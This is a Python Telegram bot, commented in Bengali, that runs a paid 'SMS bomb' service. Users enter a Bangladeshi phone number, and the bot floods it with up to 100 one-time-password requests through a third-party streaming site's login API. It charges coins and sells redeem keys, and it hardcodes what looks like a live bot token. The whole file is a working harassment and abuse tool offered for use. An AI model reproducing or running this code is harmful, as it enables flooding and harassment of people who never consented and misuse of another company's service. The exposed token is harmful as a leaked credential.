import telebot
import requests
import json
import os
import time
import threading
import random
from telebot import types

# --- কনফিগারেশন (আপনার তথ্য দিন) ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 6363065063 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস ম্যানেজমেন্ট ---
USERS_FILE = 'users.json'
KEYS_FILE = 'keys.json'

def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f: 
        json.dump(data, f, indent=4)

# ডাটা লোড
users = load_db(USERS_FILE)
keys = load_db(KEYS_FILE)

# --- ইউটিলিটি ফাংশন ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def get_user_data(uid):
    uid = str(uid)
    if uid not in users:
        users[uid] = {"coins": 50, "status": "Free User", "sent": 0, "last_used": "Never"}
        save_db(USERS_FILE, users)
    return users[uid]

# --- মেনু ডিজাইন ---
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start SMS Bomb", callback_data="bomb"),
        types.InlineKeyboardButton("👤 My Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Redeem Key", callback_data="recharge"),
        types.InlineKeyboardButton("📢 Support", url="https://t.me/DemoTestDUModz")
    )
    return markup

# --- কমান্ড হ্যান্ডলার ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    u_data = get_user_data(uid) # ডাটা লোড বা ক্রিয়েট

    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        markup.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Access Denied!**\nPlease join our channel to use this bot.", reply_markup=markup)
        return

    welcome_text = (f"🔥 **Welcome Back, {message.from_user.first_name}!** 🔥\n\n"
                    f"💰 Your Balance: `{u_data['coins']}` Coins\n"
                    f"🚀 Total Sent: `{u_data['sent']}` SMS\n"
                    f"🛡️ Status: `{u_data['status']}`\n\n"
                    f"Select an option below to start:")
    bot.send_photo(message.chat.id, LOGO_URL, caption=welcome_text, reply_markup=main_menu())

# --- অল-ইন-ওয়ান কলব্যাক হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def callback_manager(call):
    uid = str(call.from_user.id)
    u_data = get_user_data(uid)

    if call.data == "verify":
        if is_joined(call.from_user.id):
            bot.answer_callback_query(call.id, "✅ Verified!")
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)

    elif call.data == "profile":
        profile_text = (f"👤 **User Information**\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🆔 ID: `{uid}`\n"
                        f"💰 Balance: `{u_data['coins']}`\n"
                        f"🚀 Total Sent: `{u_data['sent']}`\n"
                        f"🏆 Rank: `{u_data['status']}`\n"
                        f"⏰ Last Used: `{u_data['last_used']}`")
        bot.send_message(call.message.chat.id, profile_text)

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter your secret key:**")
        bot.register_next_step_handler(msg, process_redeem)

    elif call.data == "bomb":
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
        bot.register_next_step_handler(msg, get_number)

    # --- অ্যাডমিন কলব্যাকস ---
    elif call.data.startswith("adm_"):
        if int(uid) != ADMIN_ID: return
        if call.data == "adm_stats":
            msg = f"📊 **Bot Statistics**\nTotal Users: {len(users)}\nTotal Keys: {len(keys)}"
            bot.send_message(call.message.chat.id, msg)
        elif call.data == "adm_gen":
            msg = bot.send_message(call.message.chat.id, "Enter Coin Amount (or 'lifetime'):")
            bot.register_next_step_handler(msg, generate_key_logic)

# --- এসএমএস লজিক (নিখুঁত ও উন্নত) ---
def get_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: setup_bomb(m, num))
    else:
        bot.send_message(message.chat.id, "❌ Invalid Number! Try again.")

def setup_bomb(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        cost = amount * 2
        
        if users[uid]['status'] != 'Premium' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ Low Coins! You need {cost} coins.")
            return

        p_msg = bot.send_message(message.chat.id, "🚀 **Initializing Attack...**")
        threading.Thread(target=run_bomb, args=(uid, num, amount, cost, p_msg)).start()
    except: bot.send_message(message.chat.id, "❌ Error in input!")

def run_bomb(uid, num, amount, cost, p_msg):
    success = 0
    # API List (এখানে আরও API যোগ করা যাবে)
    api_url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    
    for i in range(1, amount + 1):
        try:
            r = requests.post(api_url, json={"number": "+88" + num}, timeout=5)
            if r.status_code == 200: success += 1
            
            if i % 10 == 0: # প্রোগ্রেস আপডেট
                bot.edit_message_text(f"🚀 **Bombing {num}...**\nProgress: {i}/{amount}", p_msg.chat.id, p_msg.message_id)
            time.sleep(0.3)
        except: pass

    # ডাটা আপডেট
    if users[uid]['status'] != 'Premium':
        users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    users[uid]['last_used'] = time.strftime("%Y-%m-%d %H:%M:%S")
    save_db(USERS_FILE, users)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔄 Attack Again", callback_data="bomb"))
    bot.edit_message_text(f"✅ **Attack Finished!**\n\n🎯 Target: `{num}`\n✅ Sent: `{success}`\n💰 Cost: `{cost}` Coins", p_msg.chat.id, p_msg.message_id, reply_markup=markup)

# --- কি (Key) রিডিম লজিক ---
def process_redeem(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        val = keys[key]
        if val == "lifetime":
            users[uid]['status'] = "Premium"
        else:
            users[uid]['coins'] += int(val)
        
        del keys[key]
        save_db(KEYS_FILE, keys)
        save_db(USERS_FILE, users)
        bot.send_message(message.chat.id, "🎉 **Key Redeemed Successfully!**")
    else:
        bot.send_message(message.chat.id, "❌ Invalid or Expired Key.")

# --- অ্যাডমিন কমান্ডস ---
@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📊 Bot Stats", callback_data="adm_stats"))
    markup.add(types.InlineKeyboardButton("🔑 Generate Key", callback_data="adm_gen"))
    bot.send_message(message.chat.id, "👨‍💻 **Admin Control Panel**", reply_markup=markup)

def generate_key_logic(message):
    val = message.text
    new_key = "DUMODZ-" + "".join(random.choices("ABCDEF123456789", k=6))
    keys[new_key] = val
    save_db(KEYS_FILE, keys)
    bot.reply_to(message, f"✅ **Key Generated:** `{new_key}`\nValue: `{val}`")

@bot.message_handler(commands=['addcoins'])
def add_coins_manual(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        target_id = args[1]
        amount = int(args[2])
        if target_id in users:
            users[target_id]['coins'] += amount
            save_db(USERS_FILE, users)
            bot.reply_to(message, f"✅ Added {amount} coins to {target_id}")
        else: bot.reply_to(message, "❌ User not found.")
    except: bot.reply_to(message, "Use: `/addcoins [id] [amount]`")

# --- রান বোট ---
if __name__ == "__main__":
    print("DU ModZ Bot is Running...")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=30)
        except Exception as e:
            time.sleep(5)
